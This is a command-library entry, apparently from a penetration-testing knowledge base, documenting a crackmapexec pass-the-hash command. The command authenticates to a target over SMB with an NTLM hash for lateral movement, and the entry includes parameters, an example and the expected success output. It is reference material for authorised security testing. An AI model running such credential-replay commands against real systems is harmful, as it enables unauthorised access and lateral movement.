---
id: 25ba1994-e392-45f5-97bd-26592b3e79c9
name: authenticate-with-hash-crackmapexec
type: command
executor: bash
data: crackmapexec $_TARGET_IP -u '$_ACCOUNT_NAME$' -H "$_NTLM_HASH" -d "$_DOMAIN"
output: null
created_at: '2023-04-06T03:56:08.671653+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - smb
  - authentication
  - ntlm
verified: true
validated: true
---

# authenticate-with-hash-crackmapexec

## Command

```bash
crackmapexec $_TARGET_IP -u '$_ACCOUNT_NAME$' -H "$_NTLM_HASH" -d "$_DOMAIN"
```

## Description

Authenticates to a target using NTLM hash via SMB, testing credential validity for lateral movement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP address (e.g., 10.XXX.XXX.XXX) | Yes |
| $_ACCOUNT_NAME | Account name (append $ for machine accounts, e.g., COMPUTER$) | Yes |
| $_NTLM_HASH | NTLM hash (e.g., 31d6cfe0d16ae931b73c59d7e0c089c0) | Yes |
| $_DOMAIN | Domain name (e.g., DOMAIN) | Yes |
| -u | Username flag | Built-in |
| -H | Hash flag | Built-in |
| -d | Domain flag | Built-in |

## Examples

### Basic Usage

```bash
crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
```

## Expected Output

```
CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0
```

[+] indicates successful authentication.

## Related

- [[procedures/Extract-Service-Principal-Keys-from-Keytab]]
